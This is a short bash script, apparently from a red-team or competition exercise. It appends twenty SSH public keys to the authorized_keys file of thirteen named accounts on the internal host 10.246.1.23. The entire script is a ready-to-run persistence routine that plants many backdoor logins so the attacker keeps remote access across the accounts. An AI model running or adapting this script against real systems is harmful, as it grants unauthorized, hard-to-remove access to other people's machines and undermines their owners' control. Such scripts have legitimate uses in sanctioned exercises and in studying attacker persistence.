#!/bin/bash

# List of IP addresses
ip_addresses=("10.246.1.23")

# List of usernames corresponding to IP addresses
usernames=("cdo" "nuclear" "boothbooth" "redteam" "notredteam" "notblackteam" "windmill" "hydro" "mdesocio" "mlanglois" "cfisher" "jborst" "jbadass")

# Function to upload public keys for each account
upload_public_keys() {
    for username in "${usernames[@]}"; do
        for ((j=1; j<=20; j++)); do
            public_key="id_rsa$j.pub"
            for ip_address in "${ip_addresses[@]}"; do
                ssh "$username@$ip_address" "cat >> /home/$username/.ssh/authorized_keys" < "$public_key"
            done
        done
    done
}

# Upload public keys for each account
upload_public_keys
